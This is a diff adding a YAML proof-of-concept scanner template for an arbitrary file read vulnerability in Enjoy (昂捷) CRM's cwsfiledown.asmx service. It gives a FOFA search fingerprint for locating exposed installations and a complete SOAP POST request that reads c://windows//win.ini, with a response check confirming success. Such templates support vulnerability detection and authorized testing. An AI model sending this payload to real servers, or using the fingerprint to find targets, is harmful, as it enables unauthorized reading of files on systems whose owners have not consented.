@@ -1,0 +1,31 @@
+id: poc-yaml-enjoyit-crm-cwsfiledown-asmx-anyfile-read
+info:
+  name: 昂捷CRM cwsfiledown.asmx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 昂捷CRM
+  fofa: body="/ClientBin/slEnjoy.App.xap"
+requests:
+- method: POST
+  path: /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/DownFileBytes
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <DownFileBytes xmlns=\"http://tempuri.org/\">\n      <sFileName>c://windows//win.ini</sFileName>\n\
+    \      <iPosition>1</iPosition>\n      <iReadBytesLen>100</iReadBytesLen>\n  \
+    \    <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>\n\
+    \    </DownFileBytes>\n  </soap:Body>\n</soap:Envelope>"
+  expression: 'status_code == 200 &&
+
+    contains(body,"IHN1cHBvcnQNCltmb250c10NCltleHRlbnNpb25zXQ0K") &&
+
+    contains(body,"<DownFileBytesResult>") &&
+
+    contains(content_type,"text/xml")
+
+    '
+variables: {}
+transport: http
